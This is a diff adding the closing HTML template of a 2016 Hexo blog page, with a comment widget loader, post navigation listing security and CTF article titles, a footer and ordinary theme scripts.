+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2016/10/14/浏览器本地文件读取及远程命令执行/" data-title="浏览器本地文件读取及远程命令执行" data-url="http://yoursite.com/2016/10/14/浏览器本地文件读取及远程命令执行/"></div>
+    <script>
+        var duoshuoQuery = {short_name:"x-man"};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+    </script>
+    
+    <script> loadComment(); </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/10/14/baidu-CTF-10月-第一场/" title="下一篇: baidu-CTF-10月-第一场">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/浏览器本地文件读取及远程命令执行/">浏览器本地文件读取及远程命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/baidu-CTF-10月-第一场/">baidu-CTF-10月-第一场</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/10/Nginx/">Nginx</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/27/baidu-CTF-3/">baidu CTF 3</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/27/baidu-CTF-2/">baidu CTF 2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/23/Ajax-Security/">Ajax Security</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/03/baidu-CTF-1/">baidu CTF 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/24/wechall-writeup-about-Crypto/">wechall writeup about Crypto</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/13/my-blog-is-ok/">my blog is ok</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/13/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016 x-man
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
